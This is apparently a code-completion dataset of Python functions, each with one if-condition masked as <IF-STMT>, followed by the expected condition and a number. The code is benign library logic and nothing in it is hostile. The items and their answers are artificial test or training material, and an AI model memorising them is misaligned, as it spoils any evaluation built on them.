409,"def add(self, undoinfo, msg=None):<tab>if not undoinfo:<tab><tab>return<tab>if msg is not None:<tab><tab><IF-STMT><tab><tab><tab># replace message<tab><tab><tab>undoinfo = (msg,) + undoinfo[1:]<tab><tab>elif isinstance(undoinfo, tuple):<tab><tab><tab>undoinfo = (msg,) + undoinfo<tab><tab>else:<tab><tab><tab>undoinfo = (msg, undoinfo)<tab><tab>f = 1<tab>else:<tab><tab>f = int(isinstance(undoinfo[0], str))<tab>assert (<tab><tab>isinstance(undoinfo, list)<tab><tab>or callable(undoinfo[f])<tab><tab>or isinstance(undoinfo[f], list)<tab>)<tab>self.undoList.append(undoinfo)<tab>del self.redoList[:]","if isinstance ( undoinfo [ 0 ] , str ) :",198
410,"def assert_last_day(self, period_end):<tab># 30 days has september, april, june and november<tab>if period_end.month in [9, 4, 6, 11]:<tab><tab>self.assertEqual(period_end.day, 30)<tab># all the rest have 31, except for february<tab>elif period_end.month != 2:<tab><tab>self.assertEqual(period_end.day, 31)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(period_end.day, 29)<tab><tab>else:<tab><tab><tab>self.assertEqual(period_end.day, 28)",if calendar . isleap ( period_end . year ) :,165
411,"def remove_callback(self, callback, events=None):<tab>if events is None:<tab><tab>for event in self._plugin_lifecycle_callbacks:<tab><tab><tab>if callback in self._plugin_lifecycle_callbacks[event]:<tab><tab><tab><tab>self._plugin_lifecycle_callbacks[event].remove(callback)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>events = [events]<tab><tab>for event in events:<tab><tab><tab>if callback in self._plugin_lifecycle_callbacks[event]:<tab><tab><tab><tab>self._plugin_lifecycle_callbacks[event].remove(callback)","if isinstance ( events , basestring ) :",148
412,"def get_count(self, peek=False):<tab>if self.argument_supplied:<tab><tab>count = self.argument_value<tab><tab>if self.argument_negative:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>count = -1<tab><tab><tab>else:<tab><tab><tab><tab>count = -count<tab><tab><tab>if not peek:<tab><tab><tab><tab>self.argument_negative = False<tab><tab>if not peek:<tab><tab><tab>self.argument_supplied = False<tab>else:<tab><tab>count = 1<tab>return count",if count == 0 :,126
413,"def is_alive(self):<tab>if not self.runqemu:<tab><tab>return False<tab>if os.path.isfile(self.qemu_pidfile):<tab><tab>f = open(self.qemu_pidfile, ""r"")<tab><tab>qemu_pid = f.read()<tab><tab>f.close()<tab><tab>qemupid = int(qemu_pid)<tab><tab><IF-STMT><tab><tab><tab>self.qemupid = qemupid<tab><tab><tab>return True<tab>return False","if os . path . exists ( ""/proc/"" + str ( qemupid ) ) :",140
414,"def contains(self, other_route):<tab>if isinstance(other_route, list):<tab><tab>return self.to_list()[0 : len(other_route)] == other_route<tab># This only works before merging<tab>assert len(other_route.outgoing) <= 1, ""contains(..) cannot be called after a merge""<tab>assert len(self.outgoing) <= 1, ""contains(..) cannot be called after a merge""<tab>if other_route.task_spec == self.task_spec:<tab><tab>if other_route.outgoing and self.outgoing:<tab><tab><tab>return self.outgoing[0].contains(other_route.outgoing[0])<tab><tab>elif self.outgoing:<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>return True<tab>return False",elif not other_route . outgoing :,184
415,"def _add_connection(self, connection, uri=None):<tab>with self._connections_lock:<tab><tab>connection_id = connection.connection_id<tab><tab><IF-STMT><tab><tab><tab>self._connections[connection_id] = ConnectionInfo(<tab><tab><tab><tab>ConnectionType.OUTBOUND_CONNECTION, connection, uri, None, None<tab><tab><tab>)",if connection_id not in self . _connections :,90
416,"def view(input_path):<tab>if not exists(input_path):<tab><tab>raise IOError(""{0} not found"".format(input_path))<tab>ua = None<tab>bundle_info = None<tab>try:<tab><tab>archive = archive_factory(input_path)<tab><tab>if archive is None:<tab><tab><tab>raise NotMatched(""No matching archive type found"")<tab><tab>ua = archive.unarchive_to_temp()<tab><tab>bundle_info = ua.bundle.info<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>ua.remove()<tab>return bundle_info",if ua is not None :,139
417,"def _expect_fail_and_reconnect(self, num_reconnects, fail_last=False):<tab>self._fake_backend.connect.expect_call(**_CONNECT_KWARGS).and_raises(<tab><tab>FakeDatabaseError()<tab>)<tab>for i in xrange(num_reconnects):<tab><tab>time.sleep.expect_call(_RECONNECT_DELAY)<tab><tab><IF-STMT><tab><tab><tab>self._expect_reconnect(fail=True)<tab><tab>else:<tab><tab><tab>self._expect_reconnect(fail=fail_last)",if i < num_reconnects - 1 :,139
418,def _trigger_step(self):<tab>if self._enable_step:<tab><tab>if self.local_step != self.trainer.steps_per_epoch - 1:<tab><tab><tab># not the last step<tab><tab><tab>self._trigger()<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._trigger(),if not self . _enable_epoch :,83
419,"def draw_label(self):<tab>if self.hide:<tab><tab><IF-STMT><tab><tab><tab>seed = "" + ({0})"".format(str(int(self.seed)))<tab><tab>else:<tab><tab><tab>seed = "" + seed(s)""<tab><tab>return self.noise_type.title() + seed<tab>else:<tab><tab>return self.label or self.name","if not self . inputs [ ""Seed"" ] . is_linked :",97
420,"def get_adapter(self, pattern=None):<tab>adapters = self.get_adapters()<tab>if pattern is None:<tab><tab>if len(adapters):<tab><tab><tab>return adapters[0]<tab><tab>else:<tab><tab><tab>raise DBusNoSuchAdapterError(""No adapter(s) found"")<tab>else:<tab><tab>for adapter in adapters:<tab><tab><tab>path = adapter.get_object_path()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return adapter<tab><tab>raise DBusNoSuchAdapterError(""No adapters found with pattern: %s"" % pattern)","if path . endswith ( pattern ) or adapter [ ""Address"" ] == pattern :",144
421,"def substituteargs(self, pattern, replacement, old):<tab>new = []<tab>for k in range(len(replacement)):<tab><tab>item = replacement[k]<tab><tab>newitem = [item[0], item[1], item[2]]<tab><tab>for i in range(3):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>newitem[i] = old[k][i]<tab><tab><tab>elif item[i][:1] == ""$"":<tab><tab><tab><tab>index = int(item[i][1:]) - 1<tab><tab><tab><tab>newitem[i] = old[index][i]<tab><tab>new.append(tuple(newitem))<tab>##self.report(""old: %r"", old)<tab>##self.report(""new: %r"", new)<tab>return new","if item [ i ] == ""*"" :",187
422,"def profiling_startup():<tab>if ""--profile-sverchok-startup"" in sys.argv:<tab><tab>global _profile_nesting<tab><tab>profile = None<tab><tab>try:<tab><tab><tab>profile = get_global_profile()<tab><tab><tab>_profile_nesting += 1<tab><tab><tab>if _profile_nesting == 1:<tab><tab><tab><tab>profile.enable()<tab><tab><tab>yield profile<tab><tab>finally:<tab><tab><tab>_profile_nesting -= 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>profile.disable()<tab><tab><tab>dump_stats(file_path=""sverchok_profile.txt"")<tab><tab><tab>save_stats(""sverchok_profile.prof"")<tab>else:<tab><tab>yield None",if _profile_nesting == 0 and profile is not None :,180
423,"def align(size):<tab>if size <= 4096:<tab><tab># Small<tab><tab>if is_power2(size):<tab><tab><tab>return size<tab><tab>elif size < 128:<tab><tab><tab>return min_ge(range(16, 128 + 1, 16), size)<tab><tab><IF-STMT><tab><tab><tab>return min_ge(range(192, 512 + 1, 64), size)<tab><tab>else:<tab><tab><tab>return min_ge(range(768, 4096 + 1, 256), size)<tab>elif size < 4194304:<tab><tab># Large<tab><tab>return min_ge(range(4096, 4194304 + 1, 4096), size)<tab>else:<tab><tab># Huge<tab><tab>return min_ge(range(4194304, 536870912 + 1, 4194304), size)",elif size < 512 :,195
424,"def _validate(self, event):<tab>new = self.value<tab>if new is not None and (<tab><tab>(self.start is not None and self.start > new)<tab><tab>or (self.end is not None and self.end < new)<tab>):<tab><tab>value = datetime.strftime(new, self.format)<tab><tab>start = datetime.strftime(self.start, self.format)<tab><tab>end = datetime.strftime(self.end, self.format)<tab><tab><IF-STMT><tab><tab><tab>self.value = event.old<tab><tab>raise ValueError(<tab><tab><tab>""DatetimeInput value must be between {start} and {end}, ""<tab><tab><tab>""supplied value is {value}"".format(start=start, end=end, value=value)<tab><tab>)",if event :,183
425,"def parse(filename):<tab>dead_links = []<tab>with open(filename, ""r"") as file_:<tab><tab>for line in file_.readlines():<tab><tab><tab>res = reference_line.search(line)<tab><tab><tab>if res:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>dead_links.append(res.group(1))<tab>return dead_links",if not exists ( res . group ( 1 ) ) :,96
426,"def __getstate__(self):<tab>state = super(_GeneralExpressionDataImpl, self).__getstate__()<tab>for i in _GeneralExpressionDataImpl.__expression_slots__:<tab><tab>state[i] = getattr(self, i)<tab>if safe_mode:<tab><tab>state[""_parent_expr""] = None<tab><tab>if self._parent_expr is not None:<tab><tab><tab>_parent_expr = self._parent_expr()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>state[""_parent_expr""] = _parent_expr<tab>return state",if _parent_expr is not None :,132
427,"def insertText(self, data, parent=None):<tab>data = data<tab>if parent != self:<tab><tab>_base.TreeBuilder.insertText(self, data, parent)<tab>else:<tab><tab># HACK: allow text nodes as children of the document node<tab><tab>if hasattr(self.dom, ""_child_node_types""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.dom._child_node_types = list(self.dom._child_node_types)<tab><tab><tab><tab>self.dom._child_node_types.append(Node.TEXT_NODE)<tab><tab>self.dom.appendChild(self.dom.createTextNode(data))",if Node . TEXT_NODE not in self . dom . _child_node_types :,170
428,"def main(args):<tab>from argparse import ArgumentParser<tab>from sys import stdin, stdout<tab># TODO: Doc!<tab>argparser = ArgumentParser()<tab>argparser.add_argument(""-u"", ""--unescape"", action=""store_true"")<tab>argp = argparser.parse_args(args[1:])<tab>for line in (l.rstrip(""\n"") for l in stdin):<tab><tab><IF-STMT><tab><tab><tab>r = unescape(line)<tab><tab>else:<tab><tab><tab>r = escape(line)<tab><tab>stdout.write(r)<tab><tab>stdout.write(""\n"")",if argp . unescape :,138
429,"def validate_user_json(value, json_schema):<tab>try:<tab><tab>jsonschema.validate(value, from_json(json_schema))<tab>except jsonschema.ValidationError as e:<tab><tab><IF-STMT><tab><tab><tab>raise InvalidModelValueError(<tab><tab><tab><tab>""For '{}' the field value {}"".format(e.path[-1], e.message)<tab><tab><tab>)<tab><tab>raise InvalidModelValueError(e.message)<tab>except jsonschema.SchemaError as e:<tab><tab>raise InvalidModelValueError(e.message)<tab>validate_dates(value)",if len ( e . path ) > 1 :,140
430,"def test_mode(self):<tab>with support.temp_umask(0o002):<tab><tab>base = support.TESTFN<tab><tab>parent = os.path.join(base, ""dir1"")<tab><tab>path = os.path.join(parent, ""dir2"")<tab><tab>os.makedirs(path, 0o555)<tab><tab>self.assertTrue(os.path.exists(path))<tab><tab>self.assertTrue(os.path.isdir(path))<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(os.stat(path).st_mode & 0o777, 0o555)<tab><tab><tab>self.assertEqual(os.stat(parent).st_mode & 0o777, 0o775)","if os . name != ""nt"" :",169
431,"def __get_annotations(self):<tab>if not hasattr(self, ""_annotations""):<tab><tab>self._annotations = _retrieve_annotations(<tab><tab><tab>self._adaptor, self._primary_id, self._taxon_id<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self._annotations[""gi""] = self._identifier<tab><tab>if self._division:<tab><tab><tab>self._annotations[""data_file_division""] = self._division<tab>return self._annotations",if self . _identifier :,110
432,"def string(self):<tab>""""""Returns a PlayString in string format from the Patterns values""""""<tab>string = """"<tab>for item in self.data:<tab><tab><IF-STMT><tab><tab><tab>string += item.string()<tab><tab>elif isinstance(item, Pattern):<tab><tab><tab>string += (<tab><tab><tab><tab>""(""<tab><tab><tab><tab>+ """".join(<tab><tab><tab><tab><tab>[<tab><tab><tab><tab><tab><tab>(s.string() if hasattr(s, ""string"") else str(s))<tab><tab><tab><tab><tab><tab>for s in item.data<tab><tab><tab><tab><tab>]<tab><tab><tab><tab>)<tab><tab><tab><tab>+ "")""<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>string += str(item)<tab>return string","if isinstance ( item , ( PGroup , GeneratorPattern ) ) :",183
433,"def __getattribute__(self, item):<tab>try:<tab><tab>val = self[item]<tab><tab><IF-STMT><tab><tab><tab>val = import_string(val)<tab><tab>elif isinstance(val, (list, tuple)):<tab><tab><tab>val = [import_string(v) if isinstance(v, str) else v for v in val]<tab><tab>self[item] = val<tab>except KeyError:<tab><tab>val = super(ObjDict, self).__getattribute__(item)<tab>return val","if isinstance ( val , str ) :",118
434,"def get_identifiers(self):<tab>ids = []<tab>ifaces = [i[""name""] for i in self.middleware.call_sync(""interface.query"")]<tab>for entry in glob.glob(f""{self._base_path}/interface-*""):<tab><tab>ident = entry.rsplit(""-"", 1)[-1]<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if os.path.exists(os.path.join(entry, ""if_octets.rrd"")):<tab><tab><tab>ids.append(ident)<tab>ids.sort(key=RRDBase._sort_disks)<tab>return ids",if ident not in ifaces :,143
435,"def save_new_objects(self, commit=True):<tab>self.new_objects = []<tab>for form in self.extra_forms:<tab><tab>if not form.has_changed():<tab><tab><tab>continue<tab><tab># If someone has marked an add form for deletion, don't save the<tab><tab># object.<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self.new_objects.append(self.save_new(form, commit=commit))<tab><tab>if not commit:<tab><tab><tab>self.saved_forms.append(form)<tab>return self.new_objects",if self . can_delete and self . _should_delete_form ( form ) :,151
436,"def _get_seccomp_whitelist(self):<tab>whitelist = [False] * MAX_SYSCALL_NUMBER<tab>index = _SYSCALL_INDICIES[NATIVE_ABI]<tab>for i in range(SYSCALL_COUNT):<tab><tab># Ensure at least one syscall traps.<tab><tab># Otherwise, a simple assembly program could terminate without ever trapping.<tab><tab>if i in (sys_exit, sys_exit_group):<tab><tab><tab>continue<tab><tab>handler = self._security.get(i, DISALLOW)<tab><tab>for call in translator[i][index]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>if isinstance(handler, int):<tab><tab><tab><tab>whitelist[call] = handler == ALLOW<tab>return whitelist",if call is None :,185
437,"def start_check(aggregate, out):<tab>""""""Start checking in background and write encoded output to out.""""""<tab># check in background<tab>t = threading.Thread(target=director.check_urls, args=(aggregate,))<tab>t.start()<tab># time to wait for new data<tab>sleep_seconds = 2<tab># current running time<tab>run_seconds = 0<tab>while not aggregate.is_finished():<tab><tab>yield out.get_data()<tab><tab>time.sleep(sleep_seconds)<tab><tab>run_seconds += sleep_seconds<tab><tab><IF-STMT><tab><tab><tab>director.abort(aggregate)<tab><tab><tab>break<tab>yield out.get_data()",if run_seconds > MAX_REQUEST_SECONDS :,166
438,"def _prune_resource_identifiers(self, all_resources, all_operations):<tab>used_identifiers = self._get_identifiers_referenced_by_operations(all_operations)<tab>for resource, resource_data in list(all_resources.items()):<tab><tab>identifiers = resource_data[""resourceIdentifier""]<tab><tab>known_ids_for_resource = used_identifiers.get(resource, set())<tab><tab>for identifier_name in list(identifiers):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>del identifiers[identifier_name]<tab><tab>if not identifiers:<tab><tab><tab># If there's no identifiers used by an autocompletion<tab><tab><tab># operation, then we don't need the resource.<tab><tab><tab>del all_resources[resource]",if identifier_name not in known_ids_for_resource :,179
439,"def has_valid_checksum(self, number):<tab>given_number, given_checksum = number[:-1], number[-1]<tab>calculated_checksum = 0<tab>parameter = 7<tab>for item in given_number:<tab><tab>fragment = str(int(item) * parameter)<tab><tab>if fragment.isalnum():<tab><tab><tab>calculated_checksum += int(fragment[-1])<tab><tab><IF-STMT><tab><tab><tab>parameter = 7<tab><tab>elif parameter == 3:<tab><tab><tab>parameter = 1<tab><tab>elif parameter == 7:<tab><tab><tab>parameter = 3<tab>return str(calculated_checksum)[-1] == given_checksum",if parameter == 1 :,147
440,"def _poll_until_not(url, pending_statuses, err_msg):<tab>while True:<tab><tab>result, _, _ = _do_request(url, err_msg=err_msg)<tab><tab><IF-STMT><tab><tab><tab>time.sleep(2)<tab><tab><tab>continue<tab><tab>return result","if result [ ""status"" ] in pending_statuses :",80
441,"def wrapper(request, *args, **kw):<tab>if switch_is_active(""disable-bigquery""):<tab><tab><IF-STMT><tab><tab><tab>response = http.HttpResponse(content_type=""text/csv; charset=utf-8"")<tab><tab>else:<tab><tab><tab>response = http.HttpResponse(content_type=""application/json"", content=""[]"")<tab><tab>response.status_code = 503<tab><tab>return response<tab>return f(request, *args, **kw)","if kw . get ( ""format"" ) == ""csv"" :",119
442,"def completion_safe_apply(ctx, f, args):<tab>from guild import config<tab>with config.SetGuildHome(ctx.parent.params.get(""guild_home"")):<tab><tab>try:<tab><tab><tab>return f(*args)<tab><tab>except (Exception, SystemExit):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab><tab>return None","if os . getenv ( ""_GUILD_COMPLETE_DEBUG"" ) == ""1"" :",99
443,"def configure(self, **kw):<tab>""""""Configure the image.""""""<tab>res = ()<tab>for k, v in _cnfmerge(kw).items():<tab><tab><IF-STMT><tab><tab><tab>if k[-1] == ""_"":<tab><tab><tab><tab>k = k[:-1]<tab><tab><tab>if hasattr(v, ""__call__""):<tab><tab><tab><tab>v = self._register(v)<tab><tab><tab>elif k in (""data"", ""maskdata""):<tab><tab><tab><tab>v = self.tk._createbytearray(v)<tab><tab><tab>res = res + (""-"" + k, v)<tab>self.tk.call((self.name, ""config"") + res)",if v is not None :,154
444,"def _editor_lower(self):<tab>editorWidget = main_container.MainContainer().get_actual_editor()<tab>if editorWidget:<tab><tab>editorWidget.textCursor().beginEditBlock()<tab><tab><IF-STMT><tab><tab><tab>text = editorWidget.textCursor().selectedText().lower()<tab><tab>else:<tab><tab><tab>text = editorWidget._text_under_cursor().lower()<tab><tab><tab>editorWidget.moveCursor(QTextCursor.StartOfWord)<tab><tab><tab>editorWidget.moveCursor(QTextCursor.EndOfWord, QTextCursor.KeepAnchor)<tab><tab>editorWidget.textCursor().insertText(text)<tab><tab>editorWidget.textCursor().endEditBlock()",if editorWidget . textCursor ( ) . hasSelection ( ) :,169
445,"def on_key_release(self, symbol, modifiers):<tab>if symbol == key.LEFT or symbol == key.RIGHT:<tab><tab>self.value = not self.value<tab><tab>self.text.text = self.get_label()<tab><tab>self.toggle_func(self.value)<tab><tab><IF-STMT><tab><tab><tab>bullet_sound.play()",if enable_sound :,86
446,"def remove_checker(self, namespace, checker):<tab>for c in pyomo.core.check.ModelCheckRunner._checkers(all=True):<tab><tab><IF-STMT><tab><tab><tab>if namespace.checkers.get(c._checkerPackage(), None) is not None:<tab><tab><tab><tab>for i in range(<tab><tab><tab><tab><tab>namespace.checkers[c._checkerPackage()].count(c._checkerName())<tab><tab><tab><tab>):<tab><tab><tab><tab><tab>namespace.checkers[c._checkerPackage()].remove(c._checkerName())",if c . _checkerName ( ) == checker :,129
447,"def find_executable(names):<tab># Given a list of executable names, find the first one that is available<tab># as an executable file, on the path.<tab>for name in names:<tab><tab>fpath, fname = os.path.split(name)<tab><tab><IF-STMT><tab><tab><tab># The given name is absolute.<tab><tab><tab>if is_executable(name):<tab><tab><tab><tab>return name<tab><tab>else:<tab><tab><tab># Try to find the name on the PATH<tab><tab><tab>for path in os.environ[""PATH""].split(os.pathsep):<tab><tab><tab><tab>exe_file = os.path.join(path, name)<tab><tab><tab><tab>if is_executable(exe_file):<tab><tab><tab><tab><tab>return exe_file<tab># Could not find it :(<tab>return None",if fpath :,186
448,"def run(self):<tab>while True:<tab><tab>self.finished.wait(self.interval)<tab><tab>if self.finished.isSet():<tab><tab><tab>return<tab><tab>try:<tab><tab><tab>self.function(*self.args, **self.kwargs)<tab><tab>except Exception:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.bus.log(<tab><tab><tab><tab><tab>""Error in perpetual timer thread function %r."" % self.function,<tab><tab><tab><tab><tab>level=40,<tab><tab><tab><tab><tab>traceback=True,<tab><tab><tab><tab>)<tab><tab><tab># Quit on first error to avoid massive logs.<tab><tab><tab>raise",if self . bus :,157
449,"def get_user_object(self, user_id, group):<tab>if user_id:<tab><tab>user = OSFUser.load(user_id)<tab><tab>if not user:<tab><tab><tab>raise exceptions.NotFound(<tab><tab><tab><tab>detail=""User with id {} not found."".format(user_id)<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise exceptions.ValidationError(<tab><tab><tab><tab>detail=""User is already a member of this group.""<tab><tab><tab>)<tab><tab>return user<tab>return user_id","if group . has_permission ( user , ""member"" ) :",135
450,"def build_term_table(spec):<tab>try:<tab><tab>return _term_tables_cache[spec]<tab>except KeyError:<tab><tab>tbl = {}<tab><tab>terms = {}<tab><tab>i = 0<tab><tab>for t in spec:<tab><tab><tab>which = terms.setdefault(t, 0)<tab><tab><tab>tbl[t, which] = i<tab><tab><tab>tbl[""%s_%d"" % (t, which)] = i<tab><tab><tab><IF-STMT><tab><tab><tab><tab>tbl[t] = i<tab><tab><tab>terms[t] += 1<tab><tab><tab>i += 1<tab><tab>_term_tables_cache[spec] = tbl<tab><tab>return tbl",if which == 0 :,158
451,"def GetQualifiedWsdlName(type):<tab>with _lazyLock:<tab><tab>wsdlNSAndName = _wsdlNameMap.get(type)<tab><tab>if wsdlNSAndName:<tab><tab><tab>return wsdlNSAndName<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ns = GetWsdlNamespace(type.Item._version)<tab><tab><tab><tab>return (ns, ""ArrayOf"" + Capitalize(type.Item._wsdlName))<tab><tab><tab>else:<tab><tab><tab><tab>ns = GetWsdlNamespace(type._version)<tab><tab><tab><tab>return (ns, type._wsdlName)","if issubclass ( type , list ) :",158
452,"def train(config, checkpoint_dir=None):<tab>restored = bool(checkpoint_dir)<tab>itr = 0<tab>if checkpoint_dir:<tab><tab>with open(os.path.join(checkpoint_dir, ""ckpt.log""), ""r"") as f:<tab><tab><tab>itr = int(f.read()) + 1<tab>for i in range(itr, 10):<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""try to fail me"")<tab><tab>with tune.checkpoint_dir(step=itr) as checkpoint_dir:<tab><tab><tab>checkpoint_path = os.path.join(checkpoint_dir, ""ckpt.log"")<tab><tab><tab>with open(checkpoint_path, ""w"") as f:<tab><tab><tab><tab>f.write(str(i))<tab><tab>tune.report(test=i, training_iteration=i)",if i == 5 and not restored :,198
453,"def _process_events(self, event_list):<tab>for key, mask in event_list:<tab><tab>fileobj, (reader, writer) = key.fileobj, key.data<tab><tab>if mask & selectors.EVENT_READ and reader is not None:<tab><tab><tab>if reader._cancelled:<tab><tab><tab><tab>self.remove_reader(fileobj)<tab><tab><tab>else:<tab><tab><tab><tab>self._add_callback(reader)<tab><tab>if mask & selectors.EVENT_WRITE and writer is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.remove_writer(fileobj)<tab><tab><tab>else:<tab><tab><tab><tab>self._add_callback(writer)",if writer . _cancelled :,158
454,"def _validate_mappings(self):<tab># Validate mapping references<tab>for m in self.mapping.mapping_rules:<tab><tab>for policy_id in m.policy_ids:<tab><tab><tab>if policy_id not in self.policies:<tab><tab><tab><tab>raise ReferencedObjectNotFoundError(<tab><tab><tab><tab><tab>reference_id=policy_id, reference_type=""policy""<tab><tab><tab><tab>)<tab><tab>for w in m.whitelist_ids:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ReferencedObjectNotFoundError(<tab><tab><tab><tab><tab>reference_id=w, reference_type=""whitelist""<tab><tab><tab><tab>)",if w not in self . whitelists :,155
455,"def _transform_backward(graph, op):<tab>no_dequanted_input_vars = True<tab>for var_node in op.inputs:<tab><tab><IF-STMT><tab><tab><tab>dequant_var_node = dequantized_vars[var_node.name()]<tab><tab><tab>graph.update_input_link(var_node, dequant_var_node, op)<tab><tab><tab>no_dequanted_input_vars = False<tab>if no_dequanted_input_vars:<tab><tab>raise ValueError(""There is no dequanted inputs for op %s."" % (op.name()))",if var_node . name ( ) in dequantized_vars :,150
456,"def should_use_pty(self, pty=False, fallback=True):<tab>use_pty = False<tab>if pty:<tab><tab>use_pty = True<tab><tab># TODO: pass in & test in_stream, not sys.stdin<tab><tab><IF-STMT><tab><tab><tab>if not self.warned_about_pty_fallback:<tab><tab><tab><tab>err = ""WARNING: stdin has no fileno; falling back to non-pty execution!\n""  # noqa<tab><tab><tab><tab>sys.stderr.write(err)<tab><tab><tab><tab>self.warned_about_pty_fallback = True<tab><tab><tab>use_pty = False<tab>return use_pty",if not has_fileno ( sys . stdin ) and fallback :,171
457,"def _get_default_factory(self, attribute_name: str) -> Any:<tab>if hasattr(self, attribute_name):<tab><tab><IF-STMT><tab><tab><tab>return str(getattr(self, attribute_name))<tab><tab>elif str(self.__dataclass_fields__[attribute_name].default).startswith(""${""):<tab><tab><tab>return str(self.__dataclass_fields__[attribute_name].default)<tab><tab>elif (<tab><tab><tab>getattr(self, attribute_name)<tab><tab><tab>!= self.__dataclass_fields__[attribute_name].default_factory()<tab><tab>):<tab><tab><tab>return getattr(self, attribute_name)<tab>return self.__dataclass_fields__[attribute_name].default_factory()","if str ( getattr ( self , attribute_name ) ) . startswith ( ""${"" ) :",173
458,"def create_row_processor(<tab>self, context, path, loadopt, mapper, result, adapter, populators):<tab># look through list of columns represented here<tab># to see which, if any, is present in the row.<tab>for col in self.columns:<tab><tab><IF-STMT><tab><tab><tab>col = adapter.columns[col]<tab><tab>getter = result._getter(col, False)<tab><tab>if getter:<tab><tab><tab>populators[""quick""].append((self.key, getter))<tab><tab><tab>break<tab>else:<tab><tab>populators[""expire""].append((self.key, True))",if adapter :,145
459,"def test_finds_multiple_songs(self):<tab>for _, album in albums_in_dir(self.base):<tab><tab>n = re.search(br""album(.)song"", album[0]).group(1)<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(len(album), 2)<tab><tab>else:<tab><tab><tab>self.assertEqual(len(album), 1)","if n == b""1"" :",95
460,"def _should_update_cache(self, request, response):<tab>if not hasattr(request, ""_cache_update_cache"") or not request._cache_update_cache:<tab><tab>return False<tab>if self.cache_anonymous_only and has_vary_header(response, ""Cookie""):<tab><tab>assert hasattr(<tab><tab><tab>request, ""user""<tab><tab>), ""The Django cache middleware with CACHE_MIDDLEWARE_ANONYMOUS_ONLY=True requires authentication middleware to be installed. Edit your MIDDLEWARE_CLASSES setting to insert 'django.contrib.auth.middleware.AuthenticationMiddleware' before the CacheMiddleware.""<tab><tab><IF-STMT><tab><tab><tab># Don't cache user-variable requests from authenticated users.<tab><tab><tab>return False<tab>return True",if request . user . is_authenticated ( ) :,180
461,"def break_next_call(symbol_regex=None):<tab>while pwndbg.proc.alive:<tab><tab>ins = break_next_branch()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab># continue if not a call<tab><tab>if capstone.CS_GRP_CALL not in ins.groups:<tab><tab><tab>continue<tab><tab># return call if we don't search for a symbol<tab><tab>if not symbol_regex:<tab><tab><tab>return ins<tab><tab># return call if we match target address<tab><tab>if ins.target_const and re.match(""%s$"" % symbol_regex, hex(ins.target)):<tab><tab><tab>return ins<tab><tab># return call if we match symbol name<tab><tab>if ins.symbol and re.match(""%s$"" % symbol_regex, ins.symbol):<tab><tab><tab>return ins",if not ins :,193
462,"def parser(cls, buf, offset):<tab>type_, len_, vendor = struct.unpack_from(<tab><tab>ofproto.OFP_ACTION_VENDOR_HEADER_PACK_STR, buf, offset<tab>)<tab>data = buf[(offset + ofproto.OFP_ACTION_VENDOR_HEADER_SIZE) : offset + len_]<tab>if vendor == ofproto_common.NX_EXPERIMENTER_ID:<tab><tab>obj = NXAction.parse(data)  # noqa<tab>else:<tab><tab>cls_ = cls._ACTION_VENDORS.get(vendor, None)<tab><tab><IF-STMT><tab><tab><tab>obj = OFPActionVendorUnknown(vendor, data)<tab><tab>else:<tab><tab><tab>obj = cls_.parser(buf, offset)<tab>obj.len = len_<tab>return obj",if cls_ is None :,196
463,"def remove_empty_files(root_path):<tab>""""""Removes empty files in a path recursively""""""<tab>for directory, _, filenames in walk(root_path):<tab><tab>for filename in filenames:<tab><tab><tab>path = os.path.join(directory, filename)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>try:<tab><tab><tab><tab>os.remove(path)<tab><tab><tab>except:<tab><tab><tab><tab>logs.log_error(<tab><tab><tab><tab><tab>""Unable to remove the empty file: %s (%s).""<tab><tab><tab><tab><tab>% (path, sys.exc_info()[0])<tab><tab><tab><tab>)",if os . path . getsize ( path ) > 0 :,160
464,"def _test_set_ipv4_src(self, ip, mask=None):<tab>header = ofproto.OXM_OF_IPV4_SRC<tab>match = OFPMatch()<tab>ip = unpack(""!I"", socket.inet_aton(ip))[0]<tab>if mask is None:<tab><tab>match.set_ipv4_src(ip)<tab>else:<tab><tab>mask = unpack(""!I"", socket.inet_aton(mask))[0]<tab><tab><IF-STMT><tab><tab><tab>header = ofproto.OXM_OF_IPV4_SRC_W<tab><tab>match.set_ipv4_src_masked(ip, mask)<tab>self._test_serialize_and_parser(match, header, ip, mask)",if ( mask + 1 ) >> 32 != 1 :,182
465,"def is_valid_block(self):<tab>""""""check wheter the block is valid in the current position""""""<tab>for i in range(self.block.x):<tab><tab>for j in range(self.block.x):<tab><tab><tab>if self.block.get(i, j):<tab><tab><tab><tab>if self.block.pos.x + i < 0:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.block.pos.x + i >= COLUMNS:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.block.pos.y + j < 0:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return False<tab>return True","if self . map . get ( ( self . block . pos . x + i , self . block . pos . y + j ) , False ) :",192
